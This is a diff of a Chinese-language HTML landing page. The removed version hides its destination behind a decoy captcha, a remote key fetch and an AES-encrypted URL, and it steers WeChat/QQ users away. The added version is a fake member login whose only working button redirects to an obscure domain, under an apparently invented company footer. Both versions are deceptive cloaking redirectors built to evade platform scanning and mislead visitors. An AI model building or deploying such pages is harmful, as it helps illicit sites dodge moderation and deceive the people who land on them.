@@ -1,293 +1,91 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1.0">
-  <title>加载中……</title>
-  <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-  <style>
-    *{box-sizing:border-box}
-    body {
-      margin: 0;
-      background: #f1f5f9;
-      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-      color: #333;
-      text-align: center;
-      padding: 60px 20px;
-    }
-    .card {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      max-width: 420px;
-      margin: 40px auto 0;
-      padding: 40px 30px;
-      animation: fadeIn 0.6s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to   { opacity: 1; transform: translateY(0); }
-    }
-    .shield {
-      width: 64px;
-      height: 64px;
-      margin: 0 auto 20px;
-      animation: pulse 1.6s infinite ease-in-out;
-    }
-    .shield svg {
-      width: 100%; height: 100%;
-      fill: #4caf50;
-    }
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.15); opacity: 0.85; }
-    }
-    .message {
-      font-size: 17px;
-      margin-bottom: 20px;
-      color: #444;
-    }
-    .code-area {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-    canvas {
-      border-radius: 6px;
-      background: #eee;
-      cursor: pointer;
-    }
-    .refresh-btn {
-      background: #e0e0e0;
-      color: #333;
-      border: none;
-      padding: 6px 10px;
-      font-size: 14px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .refresh-btn:hover {
-      background: #ccc;
-    }
-    input[type="text"] {
-      padding: 12px;
-      font-size: 16px;
-      width: 180px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-    button {
-      padding: 12px 28px;
-      font-size: 16px;
-      background: #4caf50;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover {
-      background: #388e3c;
-    }
-    #error {
-      color: #e74c3c;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-    @keyframes shake {
-      0%{transform:translateX(0)}
-      25%{transform:translateX(-5px)}
-      50%{transform:translateX(5px)}
-      75%{transform:translateX(-5px)}
-      100%{transform:translateX(0)}
-    }
-    .shake { animation: shake 0.3s ease; }
-    .hidden { display: none; }
-
-    #reportBtn {
-      position: fixed;
-      top: 10px;
-      right: 12px;
-      background: #e0e0e0;
-      color: #333;
-      font-size: 13px;
-      padding: 6px 14px;
-      border: none;
-      border-radius: 18px;
-      cursor: pointer;
-      z-index: 999;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    }
-    #reportBtn:hover {
-      background: #c0c0c0;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta
+  name="viewport"
+  content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>会员后台登录</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"PingFang SC",Arial,sans-serif}
+body{background:#cfd4df;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#555}
+#panel{width:340px;background:#fff;padding:32px 26px 40px;border-radius:4px;box-shadow:0 0 6px rgba(0,0,0,.12)}
+h2{text-align:center;font-size:20px;margin-bottom:26px;color:#444}
+.row{display:flex;align-items:center;margin-bottom:18px}
+.row input{flex:1;height:40px;border:1px solid #c7ced6;border-radius:2px;font-size:15px;padding:0 10px}
+#capImg{width:120px;height:40px;border:1px solid #c7ced6;border-radius:2px;object-fit:cover;cursor:pointer;margin-right:8px}
+.btns{display:flex;justify-content:space-between;margin-top:6px}
+button{flex:1;height:40px;border:none;border-radius:3px;font-size:15px;color:#fff;cursor:pointer}
+#loginBtn{background:#2685c5;margin-right:8px}
+#guestBtn{background:#ff9600}
+button:active{filter:brightness(108%)}
+#tip{margin-top:12px;font-size:14px;color:#d32f2f;font-weight:600;text-align:center}  /* ← 提示 */
+footer{margin-top:22px;font-size:12px;line-height:1.6;text-align:center;color:#9a9a9a}
+footer a{color:#9a9a9a;text-decoration:none}
+</style>
 </head>
 <body>
 
-<button id="reportBtn" onclick="window.location.href='/tousu.html'">举报</button>
+<div id="panel">
+  <h2>会员后台登录</h2>
 
-<div id="wechat-warning" class="card hidden">
-  <div class="shield">
-    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+  <div class="row"><input placeholder="用户名" autocomplete="off"></div>
+  <div class="row"><input type="password" placeholder="密码" autocomplete="off"></div>
+
+  <div class="row">
+    <img id="capImg" title="点击刷新">
+    <input id="codeInp" placeholder="验证码" maxlength="6" autocomplete="off">
   </div>
-  <div class="message">请使用系统浏览器访问</div>
+
+  <div class="btns">
+    <button id="loginBtn">登录</button>
+    <button id="guestBtn">访客进入</button>
+  </div>
+  <div id="tip">无账号? 请选择 <b>访客进入</b></div>
 </div>
 
-<div id="verify-box" class="card hidden">
-  <div class="shield">
-    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-  </div>
-  <div class="message">请输入确认码以继续访问</div>
-  <div class="code-area">
-    <canvas id="captchaCanvas" width="120" height="40" title="点击更换确认码"></canvas>
-    <button class="refresh-btn" onclick="drawCaptcha()">换一个</button>
-  </div>
-  <input type="text" id="code-input" maxlength="4" placeholder="确认码">
-  <br>
-  <button onclick="checkCode()">确认并进入</button>
-  <div id="error"></div>
-</div>
+<footer>
+  Global Learning Resources Ltd.&nbsp;|&nbsp;Reg&nbsp;No.&nbsp;US-NY-2025-987654<br>
+  ©&nbsp;2025&nbsp;Global&nbsp;Learning&nbsp;Resources&nbsp;Ltd.&nbsp;All&nbsp;rights&nbsp;reserved<br>
+  Support:&nbsp;<a href="mailto:support@glr-inc.com">support@glr-inc.com</a>&nbsp;|&nbsp;Tel:&nbsp;+1-800-555-2199
+</footer>
 
 <script>
-const keyApi = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";
-const encryptedStr = "U2FsdGVkX19CUfvdcCRefc9qfVP9fm55yAo3ZxcJgkuwETAQxCnCeAHTJMtJb8piuQliPnsj8YRkE5DYUmKrDA==";
+const TARGET_URL="https://d99s1-fjkmm1.baidnnra1.146n.baby";          /* 访客  */
+const CODE_LEN=5;
 
-function isWX() {
-  return /micromessenger|qq\//i.test(navigator.userAgent);
-}
-
-let code = "";
-function generateCode() {
-  return Math.floor(1000 + Math.random() * 9000).toString();
-}
-function drawCaptcha() {
-  const c = document.getElementById("captchaCanvas");
-  const ctx = c.getContext("2d");
-  code = generateCode();
-  ctx.clearRect(0, 0, c.width, c.height);
-  ctx.fillStyle = "#fff";
-  ctx.fillRect(0, 0, c.width, c.height);
-
-  for (let i = 0; i < code.length; i++) {
-    const fs = 22 + Math.random() * 6;
-    ctx.font = `${fs}px Arial`;
-    ctx.fillStyle = `rgb(${Math.random()*120},${Math.random()*120},${Math.random()*120})`;
-    ctx.fillText(code[i], 10 + i * 25, 28 + Math.random() * 5);
+/* 验证*/
+const cvs=document.createElement("canvas");
+cvs.width=120;cvs.height=40;
+const ctx=cvs.getContext("2d");
+function R(a,b){return Math.floor(Math.random()*(b-a)+a);}
+function drawCap(){
+  ctx.fillStyle="#f6f8fb";ctx.fillRect(0,0,120,40);
+  ctx.strokeStyle="#234";ctx.lineWidth=2;
+  ctx.beginPath();ctx.moveTo(R(0,20),R(10,30));ctx.lineTo(R(100,120),R(10,30));ctx.stroke();
+  const chars="ABCDEFGHJKMNPQRSTUVWXYZ23456789";
+  for(let i=0;i<CODE_LEN;i++){
+    const ch=chars[R(0,chars.length)];
+    ctx.save();
+    ctx.translate(10+i*20,R(22,32));
+    ctx.rotate(R(-25,25)*Math.PI/180);
+    ctx.fillStyle=`rgb(${R(30,110)},${R(30,110)},${R(30,110)})`;
+    ctx.font="bold 18px Arial";
+    ctx.fillText(ch,0,0);
+    ctx.restore();
   }
-  for (let i = 0; i < 4; i++) {
-    ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.4)`;
-    ctx.beginPath();
-    ctx.moveTo(Math.random()*c.width, Math.random()*c.height);
-    ctx.lineTo(Math.random()*c.width, Math.random()*c.height);
-    ctx.stroke();
-  }
-  for (let i = 0; i < 20; i++) {
-    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.6)`;
-    ctx.beginPath();
-    ctx.arc(Math.random()*c.width, Math.random()*c.height, 1 + Math.random()*1.5, 0, 2 * Math.PI);
-    ctx.fill();
-  }
+  document.getElementById("capImg").src=cvs.toDataURL("image/png");
 }
-document.getElementById("captchaCanvas").addEventListener("click", drawCaptcha);
+document.getElementById("capImg").onclick=drawCap;drawCap();
 
-async function checkCode() {
-  const val = document.getElementById("code-input").value.trim();
-  if (val !== code) {
-    showErr("确认码错误，请重试", true);
-    return;
-  }
+document.getElementById("guestBtn").onclick=()=>location.href=TARGET_URL;
 
-  // ✅ 正在进入提示
-  const tip = document.createElement("div");
-  tip.innerHTML = `<span class="dot"></span> 正在进入...`;
-  tip.style.position = "fixed";
-  tip.style.top = "50%";
-  tip.style.left = "50%";
-  tip.style.transform = "translate(-50%, -50%)";
-  tip.style.background = "linear-gradient(135deg, #4caf50, #66bb6a)";
-  tip.style.color = "#fff";
-  tip.style.padding = "14px 26px";
-  tip.style.borderRadius = "12px";
-  tip.style.fontSize = "15px";
-  tip.style.fontWeight = "500";
-  tip.style.boxShadow = "0 6px 20px rgba(0,0,0,0.2)";
-  tip.style.zIndex = "9999";
-  tip.style.display = "flex";
-  tip.style.alignItems = "center";
-  tip.style.gap = "10px";
-
-  const style = document.createElement("style");
-  style.innerHTML = `
-    .dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background: #fff;
-      animation: pulseDot 1s infinite ease-in-out;
-    }
-    @keyframes pulseDot {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.5); opacity: 0.6; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-  `;
-  document.head.appendChild(style);
-  document.body.appendChild(tip);
-
-  try {
-    const key = await fetch(keyApi + "?menu=btn&v=" + Date.now()).then(r => r.text());
-    const url = CryptoJS.AES.decrypt(encryptedStr, key).toString(CryptoJS.enc.Utf8);
-    if (url.startsWith("http")) {
-      setTimeout(() => {
-        document.body.removeChild(tip);
-        location.href = url;
-      }, 1200);
-    } else {
-      showErr("打开失败，请稍后重试");
-    }
-  } catch (e) {
-    showErr("网络异常，请稍后重试");
-  }
-}
-
-function showErr(msg, shake) {
-  const box = document.getElementById("error");
-  box.innerText = msg;
-  if (shake) {
-    const inp = document.getElementById("code-input");
-    inp.classList.add("shake");
-    drawCaptcha();
-    setTimeout(() => inp.classList.remove("shake"), 300);
-  }
-}
-
-if (localStorage.getItem("blocked_user") === "permanent") {
-  document.body.innerHTML = `
-    <div class="blocked-card" id="blocked-box">
-      <div class="icon">🚫</div>
-      <div class="title">页面访问受限</div>
-      <div class="desc">
-        该页面因存在异常行为<br>
-        已被平台实施访问限制<br><br>
-      </div>
-      <div class="footer">© 2025 内容管理与安全策略中心 ｜ 版权所有</div>
-    </div>`;
-} else {
-  window.onload = () => {
-    if (isWX()) {
-      document.getElementById("wechat-warning").classList.remove("hidden");
-    } else {
-      document.getElementById("verify-box").classList.remove("hidden");
-      drawCaptcha();
-    }
-  };
-}
+document.getElementById("loginBtn").onclick=()=>{
+  drawCap();
+  const t=document.getElementById("tip");
+  t.textContent="验证码已刷新；如无账号请选择访客进入";
+  setTimeout(()=>t.textContent="👉 无账号? 请选择 访客进入",2500);
+};
 </script>
-
 </body>
 </html>
